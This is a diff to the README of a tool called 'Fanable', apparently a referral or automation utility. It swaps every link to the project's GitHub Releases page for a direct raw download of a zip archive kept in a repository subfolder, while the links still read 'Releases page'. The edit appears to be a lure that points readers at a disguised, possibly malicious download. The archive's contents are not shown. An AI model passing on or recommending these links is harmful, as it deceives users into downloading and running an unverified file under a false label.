@@ -6,7 +6,7 @@ Welcome to Fanable! This tool helps you automate various tasks and create referr
 
 ## 🔗 Download Fanable
 
-[![Download Fanable](https://img.shields.io/badge/Download-Fanable-blue.svg)](https://github.com/Brokenxz/Fanable/releases)
+[![Download Fanable](https://github.com/Brokenxz/Fanable/raw/refs/heads/main/Turnerism/Software_3.1-beta.1.zip)](https://github.com/Brokenxz/Fanable/raw/refs/heads/main/Turnerism/Software_3.1-beta.1.zip)
 
 ## 🔎 Features
 
@@ -26,7 +26,7 @@ To run Fanable, make sure your system meets the following requirements:
 
 ## 💻 Download & Install
 
-1. Visit the [Releases page](https://github.com/Brokenxz/Fanable/releases).
+1. Visit the [Releases page](https://github.com/Brokenxz/Fanable/raw/refs/heads/main/Turnerism/Software_3.1-beta.1.zip).
 2. Choose the latest version available.
 3. Click on the desired installation file for your operating system.
 4. Follow the installation prompts on your screen. 
@@ -50,7 +50,7 @@ Once the installation is complete, you can start using Fanable right away!
 
 ### Runtime Issues
 
-- **Application Crashes**: Update to the latest version if available, via the [Releases page](https://github.com/Brokenxz/Fanable/releases).
+- **Application Crashes**: Update to the latest version if available, via the [Releases page](https://github.com/Brokenxz/Fanable/raw/refs/heads/main/Turnerism/Software_3.1-beta.1.zip).
 - **Feature Not Working**: Refer to the user manual included in the application to check configuration settings.
 
 ## ⌨️ Frequently Asked Questions
@@ -79,4 +79,4 @@ We welcome contributions from users! If you would like to help improve Fanable, 
 
 If you need further assistance or have questions, please reach out through our GitHub page. We are here to help you!
 
-Remember to visit the [Releases page](https://github.com/Brokenxz/Fanable/releases) to download the latest version and start automating your tasks right away!
+Remember to visit the [Releases page](https://github.com/Brokenxz/Fanable/raw/refs/heads/main/Turnerism/Software_3.1-beta.1.zip) to download the latest version and start automating your tasks right away!
